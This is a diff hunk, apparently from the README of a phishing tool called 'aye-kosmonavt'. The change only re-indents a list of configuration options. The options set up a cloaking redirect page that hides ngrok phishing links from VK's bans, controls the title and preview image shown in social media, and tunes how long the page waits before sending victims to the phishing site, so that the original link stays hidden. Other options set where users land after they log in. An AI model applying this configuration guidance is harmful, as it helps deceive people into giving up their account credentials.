@@ -70,11 +70,11 @@ Here it used for hide ngrok links, what often are banned by VK. Also aye-kosmona
 Config stored in `config/aye-kosmonavt.yml`. You can create multiple presets for you convenience and select it by `use` option.
 
 Options used in config (**all required**): 
-	1. `beforeLoginTitle` - link title what will be displayed in tab title or in social media link preview
-	2. `beforeLoginImage` - image what will be displayed on redirection page.
-	3. `beforeLoginSocialImage` - e.g `OgImage`, will be used in social media preview
-	4. `beforeLoginRedirTime` - time before user will redirected to phishing  (less better, but not 0, because 0 will expose your original link)
-	5. `afterLoginTitle` - title, of tab, for what user will be redirected after successful authorization (such as all `afterLogin*`)
-	6. `afterLoginImage` - Background image of tab
-	7. `afterLoginUrl` - url, to what user will be redirected
-	8. `afterLoginRedirTime` - time to redirect to `afterLoginUrl`, better is 5-10 secs.
+1. `beforeLoginTitle` - link title what will be displayed in tab title or in social media link preview
+2. `beforeLoginImage` - image what will be displayed on redirection page.
+3. `beforeLoginSocialImage` - e.g `OgImage`, will be used in social media preview
+4. `beforeLoginRedirTime` - time before user will redirected to phishing  (less better, but not 0, because 0 will expose your original link)
+5. `afterLoginTitle` - title, of tab, for what user will be redirected after successful authorization (such as all `afterLogin*`)
+6. `afterLoginImage` - Background image of tab
+7. `afterLoginUrl` - url, to what user will be redirected
+8. `afterLoginRedirTime` - time to redirect to `afterLoginUrl`, better is 5-10 secs.
